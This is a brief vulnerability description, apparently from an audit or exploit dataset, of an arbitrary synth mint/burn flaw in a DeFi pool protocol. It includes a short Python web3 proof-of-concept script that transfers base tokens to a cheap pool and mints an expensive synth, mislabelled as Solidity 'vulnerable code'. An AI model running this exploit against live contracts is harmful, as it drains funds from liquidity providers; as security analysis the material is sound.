Type of vulnerability: Arbitrary Synth Mint/Burn

Cause of vulnerability: The pool can mint arbitrary Synths provided they are valid, allowing users to mint expensive synthetics from cheaper AMM pools and burn them at expensive pools for profit.

Execution process: A hacker transfers a base token (sparta_amount) to a cheaper pool (dai_pool), mints a more expensive synthetic token (link_synth) from this cheaper pool, and then burns this synthetic token at an expensive pool (link_pool) to profit from the price difference.

Vulnerable code: 
```solidity
sparta_amount = 100 * 10**18
initail_link_synth = link_synth.functions.balanceOf(user).call()
base.functions.transfer(dai_pool.address, sparta_amount).transact({'from': user})
dai_pool.functions.mintSynth(link_synth.address, user).transact({'from': user})
after_link_synth = link_synth.functions.balanceOf(user).call()
print('get link synth amount from dai pool:', after_link_synth - initail_link_synth)
```
